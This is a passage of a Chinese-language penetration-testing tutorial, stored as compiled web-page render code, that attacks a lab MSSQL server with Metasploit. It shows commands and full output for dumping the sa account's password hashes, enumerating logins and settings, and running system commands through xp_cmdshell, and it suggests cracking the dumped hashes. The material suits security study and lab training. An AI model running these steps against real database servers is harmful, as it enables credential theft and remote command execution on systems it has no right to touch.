,a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br"),a("span",{staticClass:"line-number"},[s._v("39")]),a("br"),a("span",{staticClass:"line-number"},[s._v("40")]),a("br"),a("span",{staticClass:"line-number"},[s._v("41")]),a("br"),a("span",{staticClass:"line-number"},[s._v("42")]),a("br"),a("span",{staticClass:"line-number"},[s._v("43")]),a("br"),a("span",{staticClass:"line-number"},[s._v("44")]),a("br"),a("span",{staticClass:"line-number"},[s._v("45")]),a("br"),a("span",{staticClass:"line-number"},[s._v("46")]),a("br"),a("span",{staticClass:"line-number"},[s._v("47")]),a("br"),a("span",{staticClass:"line-number"},[s._v("48")]),a("br"),a("span",{staticClass:"line-number"},[s._v("49")]),a("br"),a("span",{staticClass:"line-number"},[s._v("50")]),a("br"),a("span",{staticClass:"line-number"},[s._v("51")]),a("br"),a("span",{staticClass:"line-number"},[s._v("52")]),a("br"),a("span",{staticClass:"line-number"},[s._v("53")]),a("br"),a("span",{staticClass:"line-number"},[s._v("54")]),a("br"),a("span",{staticClass:"line-number"},[s._v("55")]),a("br"),a("span",{staticClass:"line-number"},[s._v("56")]),a("br"),a("span",{staticClass:"line-number"},[s._v("57")]),a("br"),a("span",{staticClass:"line-number"},[s._v("58")]),a("br"),a("span",{staticClass:"line-number"},[s._v("59")]),a("br"),a("span",{staticClass:"line-number"},[s._v("60")]),a("br"),a("span",{staticClass:"line-number"},[s._v("61")]),a("br"),a("span",{staticClass:"line-number"},[s._v("62")]),a("br"),a("span",{staticClass:"line-number"},[s._v("63")]),a("br"),a("span",{staticClass:"line-number"},[s._v("64")]),a("br"),a("span",{staticClass:"line-number"},[s._v("65")]),a("br"),a("span",{staticClass:"line-number"},[s._v("66")]),a("br"),a("span",{staticClass:"line-number"},[s._v("67")]),a("br"),a("span",{staticClass:"line-number"},[s._v("68")]),a("br"),a("span",{staticClass:"line-number"},[s._v("69")]),a("br"),a("span",{staticClass:"line-number"},[s._v("70")]),a("br"),a("span",{staticClass:"line-number"},[s._v("71")]),a("br"),a("span",{staticClass:"line-number"},[s._v("72")]),a("br"),a("span",{staticClass:"line-number"},[s._v("73")]),a("br"),a("span",{staticClass:"line-number"},[s._v("74")]),a("br"),a("span",{staticClass:"line-number"},[s._v("75")]),a("br"),a("span",{staticClass:"line-number"},[s._v("76")]),a("br"),a("span",{staticClass:"line-number"},[s._v("77")]),a("br"),a("span",{staticClass:"line-number"},[s._v("78")]),a("br"),a("span",{staticClass:"line-number"},[s._v("79")]),a("br"),a("span",{staticClass:"line-number"},[s._v("80")]),a("br"),a("span",{staticClass:"line-number"},[s._v("81")]),a("br"),a("span",{staticClass:"line-number"},[s._v("82")]),a("br"),a("span",{staticClass:"line-number"},[s._v("83")]),a("br"),a("span",{staticClass:"line-number"},[s._v("84")]),a("br"),a("span",{staticClass:"line-number"},[s._v("85")]),a("br"),a("span",{staticClass:"line-number"},[s._v("86")]),a("br"),a("span",{staticClass:"line-number"},[s._v("87")]),a("br"),a("span",{staticClass:"line-number"},[s._v("88")]),a("br"),a("span",{staticClass:"line-number"},[s._v("89")]),a("br")])]),a("p",[s._v("可以看到目标数据库的用户名为sa，密码为123456")]),s._v(" "),a("h2",{attrs:{id:"查找-捕获服务器的口令"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#查找-捕获服务器的口令"}},[s._v("#")]),s._v(" 查找/捕获服务器的口令")]),s._v(" "),a("p",[s._v("这里，用到的是Metasploit的mssql_hashdump模块。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("use auxiliary/scanner/mssql/mssql_hashdump\nshow options\nset RHOSTS 192.168.109.139\nset PASSWORD 123456\nrun\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("具体操作情况如下：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('msf auxiliary(scanner/mssql/mssql_login) > use auxiliary/scanner/mssql/mssql_hashdump \nmsf auxiliary(scanner/mssql/mssql_hashdump) > show options\n\nModule options (auxiliary/scanner/mssql/mssql_hashdump):\n\n   Name                 Current Setting  Required  Description\n   ----                 ---------------  --------  -----------\n   PASSWORD                              no        The password for the specified username\n   RHOSTS                                yes       The target address range or CIDR identifier\n   RPORT                1433             yes       The target port (TCP)\n   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"\n   THREADS              1                yes       The number of concurrent threads\n   USERNAME             sa               no        The username to authenticate as\n   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)\n\nmsf auxiliary(scanner/mssql/mssql_hashdump) > set RHOSTS 192.168.109.139\nRHOSTS => 192.168.109.139\nmsf auxiliary(scanner/mssql/mssql_hashdump) > set PASSWORD 123456\nPASSWORD => 123456\nmsf auxiliary(scanner/mssql/mssql_hashdump) > run\n\n[*] 192.168.109.139:1433  - Instance Name: nil\n[+] 192.168.109.139:1433  - Saving mssql05 = sa:0100803a5accdbbe36fd02ade28e2e4ed463f311238ab3410a92\n[+] 192.168.109.139:1433  - Saving mssql05 = ##MS_PolicyTsqlExecutionLogin##:0100ab666dffdfa0f0ce5d9dc217abc8b87bface1efda74dba9c\n[+] 192.168.109.139:1433  - Saving mssql05 = ##MS_PolicyEventProcessingLogin##:0100ad950534143cd9e69553cd7715b5d0b68c54032124ee8992\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(scanner/mssql/mssql_hashdump) > \n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br")])]),a("p",[s._v("接下来，我们就可以使用其他工具爆破这些密码了。")]),s._v(" "),a("h2",{attrs:{id:"浏览mssql"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#浏览mssql"}},[s._v("#")]),s._v(" 浏览MSSQL")]),s._v(" "),a("p",[s._v("这里用到的是Metasploit的mssql_enum模块。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("use auxiliary/admin/mssql/mssql_enum\nshow options\nset RHOST 192.168.109.139\nset PASSWORD 123456\nrun\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("具体操作情况如下：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('msf > use auxiliary/admin/mssql/mssql_enum\nmsf auxiliary(admin/mssql/mssql_enum) > show options\n\nModule options (auxiliary/admin/mssql/mssql_enum):\n\n   Name                 Current Setting  Required  Description\n   ----                 ---------------  --------  -----------\n   PASSWORD                              no        The password for the specified username\n   RHOST                                 yes       The target address\n   RPORT                1433             yes       The target port (TCP)\n   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"\n   USERNAME             sa               no        The username to authenticate as\n   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)\n\nmsf auxiliary(admin/mssql/mssql_enum) > set RHOST 192.168.109.139\nRHOST => 192.168.109.139\nmsf auxiliary(admin/mssql/mssql_enum) > set PASSWORD 123456\nPASSWORD => 123456\nmsf auxiliary(admin/mssql/mssql_enum) > run\n\n[*] 192.168.109.139:1433 - Running MS SQL Server Enumeration...\n[*] 192.168.109.139:1433 - Version:\n[*] Microsoft SQL Server 2008 R2 (SP2) - 10.50.4000.0 (X64) \n[*]     Jun 28 2012 08:36:30 \n[*]     Copyright (c) Microsoft Corporation\n[*]     Express Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1) (Hypervisor)\n[*] 192.168.109.139:1433 - Configuration Parameters:\n[*] 192.168.109.139:1433 -  C2 Audit Mode is Not Enabled\n[*] 192.168.109.139:1433 -  xp_cmdshell is Enabled\n[*] 192.168.109.139:1433 -  remote access is Enabled\n[*] 192.168.109.139:1433 -  allow updates is Not Enabled\n[*] 192.168.109.139:1433 -  Database Mail XPs is Not Enabled\n[*] 192.168.109.139:1433 -  Ole Automation Procedures are Not Enabled\n[*] 192.168.109.139:1433 - Databases on the server:\n[*] 192.168.109.139:1433 -  Database name:master\n[*] 192.168.109.139:1433 -  Database Files for master:\n[*] 192.168.109.139:1433 -      d:\\Program Files\\Microsoft SQL Server\\MSSQL10_50.MSSQLSERVER\\MSSQL\\DATA\\master.mdf\n[*] 192.168.109.139:1433 -      d:\\Program Files\\Microsoft SQL Server\\MSSQL10_50.MSSQLSERVER\\MSSQL\\DATA\\mastlog.ldf\n[*] 192.168.109.139:1433 -  Database name:tempdb\n[*] 192.168.109.139:1433 -  Database Files for tempdb:\n[*] 192.168.109.139:1433 -      d:\\Program Files\\Microsoft SQL Server\\MSSQL10_50.MSSQLSERVER\\MSSQL\\DATA\\tempdb.mdf\n[*] 192.168.109.139:1433 -      d:\\Program Files\\Microsoft SQL Server\\MSSQL10_50.MSSQLSERVER\\MSSQL\\DATA\\templog.ldf\n[*] 192.168.109.139:1433 -  Database name:model\n[*] 192.168.109.139:1433 -  Database Files for model:\n[*] 192.168.109.139:1433 -      d:\\Program Files\\Microsoft SQL Server\\MSSQL10_50.MSSQLSERVER\\MSSQL\\DATA\\model.mdf\n[*] 192.168.109.139:1433 -      d:\\Program Files\\Microsoft SQL Server\\MSSQL10_50.MSSQLSERVER\\MSSQL\\DATA\\modellog.ldf\n[*] 192.168.109.139:1433 -  Database name:msdb\n[*] 192.168.109.139:1433 -  Database Files for msdb:\n[*] 192.168.109.139:1433 -      d:\\Program Files\\Microsoft SQL Server\\MSSQL10_50.MSSQLSERVER\\MSSQL\\DATA\\MSDBData.mdf\n[*] 192.168.109.139:1433 -      d:\\Program Files\\Microsoft SQL Server\\MSSQL10_50.MSSQLSERVER\\MSSQL\\DATA\\MSDBLog.ldf\n[*] 192.168.109.139:1433 - System Logins on this Server:\n[*] 192.168.109.139:1433 -  sa\n[*] 192.168.109.139:1433 -  ##MS_SQLResourceSigningCertificate##\n[*] 192.168.109.139:1433 -  ##MS_SQLReplicationSigningCertificate##\n[*] 192.168.109.139:1433 -  ##MS_SQLAuthenticatorCertificate##\n[*] 192.168.109.139:1433 -  ##MS_PolicySigningCertificate##\n[*] 192.168.109.139:1433 -  ##MS_SmoExtendedSigningCertificate##\n[*] 192.168.109.139:1433 -  ##MS_PolicyTsqlExecutionLogin##\n[*] 192.168.109.139:1433 -  NT AUTHORITY\\SYSTEM\n[*] 192.168.109.139:1433 -  NT SERVICE\\MSSQLSERVER\n[*] 192.168.109.139:1433 -  liuyazhuang-PC\\liuyazhuang\n[*] 192.168.109.139:1433 -  BUILTIN\\Users\n[*] 192.168.109.139:1433 -  ##MS_PolicyEventProcessingLogin##\n[*] 192.168.109.139:1433 -  ##MS_AgentSigningCertificate##\n[*] 192.168.109.139:1433 - Disabled Accounts:\n[*] 192.168.109.139:1433 -  ##MS_PolicyTsqlExecutionLogin##\n[*] 192.168.109.139:1433 -  ##MS_PolicyEventProcessingLogin##\n[*] 192.168.109.139:1433 - No Accounts Policy is set for:\n[*] 192.168.109.139:1433 -  All System Accounts have the Windows Account Policy Applied to them.\n[*] 192.168.109.139:1433 - Password Expiration is not checked for:\n[*] 192.168.109.139:1433 -  sa\n[*] 192.168.109.139:1433 -  ##MS_PolicyTsqlExecutionLogin##\n[*] 192.168.109.139:1433 -  ##MS_PolicyEventProcessingLogin##\n[*] 192.168.109.139:1433 - System Admin Logins on this Server:\n[*] 192.168.109.139:1433 -  sa\n[*] 192.168.109.139:1433 -  NT AUTHORITY\\SYSTEM\n[*] 192.168.109.139:1433 -  NT SERVICE\\MSSQLSERVER\n[*] 192.168.109.139:1433 -  liuyazhuang-PC\\liuyazhuang\n[*] 192.168.109.139:1433 - Windows Logins on this Server:\n[*] 192.168.109.139:1433 -  NT AUTHORITY\\SYSTEM\n[*] 192.168.109.139:1433 -  liuyazhuang-PC\\liuyazhuang\n[*] 192.168.109.139:1433 - Windows Groups that can logins on this Server:\n[*] 192.168.109.139:1433 -  NT SERVICE\\MSSQLSERVER\n[*] 192.168.109.139:1433 -  BUILTIN\\Users\n[*] 192.168.109.139:1433 - Accounts with Username and Password being the same:\n[*] 192.168.109.139:1433 -  No Account with its password being the same as its username was found.\n[*] 192.168.109.139:1433 - Accounts with empty password:\n[*] 192.168.109.139:1433 -  No Accounts with empty passwords where found.\n[*] 192.168.109.139:1433 - Stored Procedures with Public Execute Permission found:\n[*] 192.168.109.139:1433 -  sp_replsetsyncstatus\n[*] 192.168.109.139:1433 -  sp_replcounters\n[*] 192.168.109.139:1433 -  sp_replsendtoqueue\n[*] 192.168.109.139:1433 -  sp_resyncexecutesql\n[*] 192.168.109.139:1433 -  sp_prepexecrpc\n[*] 192.168.109.139:1433 -  sp_repltrans\n[*] 192.168.109.139:1433 -  sp_xml_preparedocument\n[*] 192.168.109.139:1433 -  xp_qv\n[*] 192.168.109.139:1433 -  xp_getnetname\n[*] 192.168.109.139:1433 -  sp_releaseschemalock\n[*] 192.168.109.139:1433 -  sp_refreshview\n[*] 192.168.109.139:1433 -  sp_replcmds\n[*] 192.168.109.139:1433 -  sp_unprepare\n[*] 192.168.109.139:1433 -  sp_resyncprepare\n[*] 192.168.109.139:1433 -  sp_createorphan\n[*] 192.168.109.139:1433 -  xp_dirtree\n[*] 192.168.109.139:1433 -  sp_replwritetovarbin\n[*] 192.168.109.139:1433 -  sp_replsetoriginator\n[*] 192.168.109.139:1433 -  sp_xml_removedocument\n[*] 192.168.109.139:1433 -  sp_repldone\n[*] 192.168.109.139:1433 -  sp_reset_connection\n[*] 192.168.109.139:1433 -  xp_fileexist\n[*] 192.168.109.139:1433 -  xp_fixeddrives\n[*] 192.168.109.139:1433 -  sp_getschemalock\n[*] 192.168.109.139:1433 -  sp_prepexec\n[*] 192.168.109.139:1433 -  xp_revokelogin\n[*] 192.168.109.139:1433 -  sp_resyncuniquetable\n[*] 192.168.109.139:1433 -  sp_replflush\n[*] 192.168.109.139:1433 -  sp_resyncexecute\n[*] 192.168.109.139:1433 -  xp_grantlogin\n[*] 192.168.109.139:1433 -  sp_droporphans\n[*] 192.168.109.139:1433 -  xp_regread\n[*] 192.168.109.139:1433 -  sp_getbindtoken\n[*] 192.168.109.139:1433 -  sp_replincrementlsn\n[*] 192.168.109.139:1433 - Instances found on this server:\n[*] 192.168.109.139:1433 -  MSSQLSERVER\n[*] 192.168.109.139:1433 - Default Server Instance SQL Server Service is running under the privilege of:\n[*] 192.168.109.139:1433 -  NT AUTHORITY\\NETWORKSERVICE\n[*] Auxiliary module execution completed\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br"),a("span",{staticClass:"line-number"},[s._v("39")]),a("br"),a("span",{staticClass:"line-number"},[s._v("40")]),a("br"),a("span",{staticClass:"line-number"},[s._v("41")]),a("br"),a("span",{staticClass:"line-number"},[s._v("42")]),a("br"),a("span",{staticClass:"line-number"},[s._v("43")]),a("br"),a("span",{staticClass:"line-number"},[s._v("44")]),a("br"),a("span",{staticClass:"line-number"},[s._v("45")]),a("br"),a("span",{staticClass:"line-number"},[s._v("46")]),a("br"),a("span",{staticClass:"line-number"},[s._v("47")]),a("br"),a("span",{staticClass:"line-number"},[s._v("48")]),a("br"),a("span",{staticClass:"line-number"},[s._v("49")]),a("br"),a("span",{staticClass:"line-number"},[s._v("50")]),a("br"),a("span",{staticClass:"line-number"},[s._v("51")]),a("br"),a("span",{staticClass:"line-number"},[s._v("52")]),a("br"),a("span",{staticClass:"line-number"},[s._v("53")]),a("br"),a("span",{staticClass:"line-number"},[s._v("54")]),a("br"),a("span",{staticClass:"line-number"},[s._v("55")]),a("br"),a("span",{staticClass:"line-number"},[s._v("56")]),a("br"),a("span",{staticClass:"line-number"},[s._v("57")]),a("br"),a("span",{staticClass:"line-number"},[s._v("58")]),a("br"),a("span",{staticClass:"line-number"},[s._v("59")]),a("br"),a("span",{staticClass:"line-number"},[s._v("60")]),a("br"),a("span",{staticClass:"line-number"},[s._v("61")]),a("br"),a("span",{staticClass:"line-number"},[s._v("62")]),a("br"),a("span",{staticClass:"line-number"},[s._v("63")]),a("br"),a("span",{staticClass:"line-number"},[s._v("64")]),a("br"),a("span",{staticClass:"line-number"},[s._v("65")]),a("br"),a("span",{staticClass:"line-number"},[s._v("66")]),a("br"),a("span",{staticClass:"line-number"},[s._v("67")]),a("br"),a("span",{staticClass:"line-number"},[s._v("68")]),a("br"),a("span",{staticClass:"line-number"},[s._v("69")]),a("br"),a("span",{staticClass:"line-number"},[s._v("70")]),a("br"),a("span",{staticClass:"line-number"},[s._v("71")]),a("br"),a("span",{staticClass:"line-number"},[s._v("72")]),a("br"),a("span",{staticClass:"line-number"},[s._v("73")]),a("br"),a("span",{staticClass:"line-number"},[s._v("74")]),a("br"),a("span",{staticClass:"line-number"},[s._v("75")]),a("br"),a("span",{staticClass:"line-number"},[s._v("76")]),a("br"),a("span",{staticClass:"line-number"},[s._v("77")]),a("br"),a("span",{staticClass:"line-number"},[s._v("78")]),a("br"),a("span",{staticClass:"line-number"},[s._v("79")]),a("br"),a("span",{staticClass:"line-number"},[s._v("80")]),a("br"),a("span",{staticClass:"line-number"},[s._v("81")]),a("br"),a("span",{staticClass:"line-number"},[s._v("82")]),a("br"),a("span",{staticClass:"line-number"},[s._v("83")]),a("br"),a("span",{staticClass:"line-number"},[s._v("84")]),a("br"),a("span",{staticClass:"line-number"},[s._v("85")]),a("br"),a("span",{staticClass:"line-number"},[s._v("86")]),a("br"),a("span",{staticClass:"line-number"},[s._v("87")]),a("br"),a("span",{staticClass:"line-number"},[s._v("88")]),a("br"),a("span",{staticClass:"line-number"},[s._v("89")]),a("br"),a("span",{staticClass:"line-number"},[s._v("90")]),a("br"),a("span",{staticClass:"line-number"},[s._v("91")]),a("br"),a("span",{staticClass:"line-number"},[s._v("92")]),a("br"),a("span",{staticClass:"line-number"},[s._v("93")]),a("br"),a("span",{staticClass:"line-number"},[s._v("94")]),a("br"),a("span",{staticClass:"line-number"},[s._v("95")]),a("br"),a("span",{staticClass:"line-number"},[s._v("96")]),a("br"),a("span",{staticClass:"line-number"},[s._v("97")]),a("br"),a("span",{staticClass:"line-number"},[s._v("98")]),a("br"),a("span",{staticClass:"line-number"},[s._v("99")]),a("br"),a("span",{staticClass:"line-number"},[s._v("100")]),a("br"),a("span",{staticClass:"line-number"},[s._v("101")]),a("br"),a("span",{staticClass:"line-number"},[s._v("102")]),a("br"),a("span",{staticClass:"line-number"},[s._v("103")]),a("br"),a("span",{staticClass:"line-number"},[s._v("104")]),a("br"),a("span",{staticClass:"line-number"},[s._v("105")]),a("br"),a("span",{staticClass:"line-number"},[s._v("106")]),a("br"),a("span",{staticClass:"line-number"},[s._v("107")]),a("br"),a("span",{staticClass:"line-number"},[s._v("108")]),a("br"),a("span",{staticClass:"line-number"},[s._v("109")]),a("br"),a("span",{staticClass:"line-number"},[s._v("110")]),a("br"),a("span",{staticClass:"line-number"},[s._v("111")]),a("br"),a("span",{staticClass:"line-number"},[s._v("112")]),a("br"),a("span",{staticClass:"line-number"},[s._v("113")]),a("br"),a("span",{staticClass:"line-number"},[s._v("114")]),a("br"),a("span",{staticClass:"line-number"},[s._v("115")]),a("br"),a("span",{staticClass:"line-number"},[s._v("116")]),a("br"),a("span",{staticClass:"line-number"},[s._v("117")]),a("br"),a("span",{staticClass:"line-number"},[s._v("118")]),a("br"),a("span",{staticClass:"line-number"},[s._v("119")]),a("br"),a("span",{staticClass:"line-number"},[s._v("120")]),a("br"),a("span",{staticClass:"line-number"},[s._v("121")]),a("br"),a("span",{staticClass:"line-number"},[s._v("122")]),a("br"),a("span",{staticClass:"line-number"},[s._v("123")]),a("br"),a("span",{staticClass:"line-number"},[s._v("124")]),a("br"),a("span",{staticClass:"line-number"},[s._v("125")]),a("br"),a("span",{staticClass:"line-number"},[s._v("126")]),a("br"),a("span",{staticClass:"line-number"},[s._v("127")]),a("br"),a("span",{staticClass:"line-number"},[s._v("128")]),a("br")])]),a("h2",{attrs:{id:"重新载入xp-cmd功能"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#重新载入xp-cmd功能"}},[s._v("#")]),s._v(" 重新载入xp_cmd功能")]),s._v(" "),a("p",[s._v("这里用到的是Metasploit的mssql_exec, 通过重新载入禁用的xp_cmdshell功能来运行系统级的命令")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("use auxiliary/admin/mssql/mssql_exec\nshow options\nset CMD 'ipconfig'\nset RHOST 192.168.109.139\nset PASSWORD 123456\nrun\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[s._v("具体操作情况如下：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("msf > use auxiliary/admin/mssql/mssql_exec \nmsf auxiliary(admin/mssql/mssql_exec) > show options\n\nModule options (auxiliary/admin/mssql/mssql_exec):\n\n   Name                 Current Setting                       Required  Description\n   ----                 ---------------                       --------  -----------\n   CMD                  cmd.exe /c echo OWNED > C:\\owned.exe  no        Command to execute\n   PASSWORD                                                   no        The password for the specified username\n   RHOST                                                      yes       The target address\n   RPORT                1433                                  yes       The target port (TCP)\n   TDSENCRYPTION        false                                 yes       Use TLS/SSL for TDS data \"Force Encryption\"\n   USERNAME             sa                                    no        The username to authenticate as\n   USE_WINDOWS_AUTHENT  false                                 yes       Use windows authentification (requires DOMAIN option set)\n\nmsf auxiliary(admin/mssql/mssql_exec) > set CMD 'ipconfig'\nCMD => ipconfig\nmsf auxiliary(admin/mssql/mssql_exec) > set RHOST 192.168.109.139\nRHOST => 192.168.109.139\nmsf auxiliary(admin/mssql/mssql_exec) > set PASSWORD 123456\nPASSWORD => 123456\nmsf auxiliary(admin/mssql/mssql_exec) > run\n\n[*] 192.168.109.139:1433 - SQL Query: EXEC master..xp_cmdshell 'ipconfig'\n\n\n\n output\n ------\n \n Windows IP M�n\n \n \n *g�w�M�hV VPN - VPN Client:\n \n    �ZSO�r`  . . . . . . . . . . . . : �ZSO�]�e_\n    ޏ�cyr�[�v DNS T . . . . . . . : \n \n �N*YQ�M�hV Bluetooth Q�~ޏ�c:\n \n    �ZSO�r`  . . . . . . . . . . . . : �ZSO�]�e_\n    ޏ�cyr�[�v DNS T . . . . . . . : \n \n �N*YQ�M�hV ,g0Wޏ�c:\n \n    ޏ�cyr�[�v DNS T . . . . . . . : localdomain\n    ,g0W���c IPv6 0W@W. . . . . . . . : fe80::ccb2:bf07:23ba:9925%11\n    IPv4 0W@W . . . . . . . . . . . . : 192.168.109.139\n    P[Q�cx  . . . . . . . . . . . . : 255.255.255.0\n    ؞��QsQ. . . . . . . . . . . . . : 192.168.109.2\n \n ��S��M�hV isatap.{5761F2CD-B72F-4D63-9594-8FFF71AE3A2D}:\n \n    �ZSO�r`  . . . . . . . . . . . . : �ZSO�]�e_\n    ޏ�cyr�[�v DNS T . . . . . . . : \n \n ��S��M�hV ,g0Wޏ�c* 6:\n \n    �ZSO�r`  . . . . . . . . . . . . : �ZSO�]�e_\n    ޏ�cyr�[�v DNS T . . . . . . . : \n \n ��S��M�hV isatap.localdomain:\n \n    �ZSO�r`  . . . . . . . . . . . . : �ZSO�]�e_\n    ޏ�cyr�[�v DNS T . . . . . . . : localdomain\n \n ��S��M�hV isatap.{BE1D7C8C-9941-432D-97A0-B5A8B6A37A0B}:\n \n    �ZSO�r`  . . . . . . . . . . . . : �ZSO�]�e_\n    ޏ�cyr�[�v DNS T . . . . . . . : \n \n\n[*] Auxiliary module execution completed\nmsf auxiliary(admin/mssql/mssql_exec) > \n")])]),s._v(" 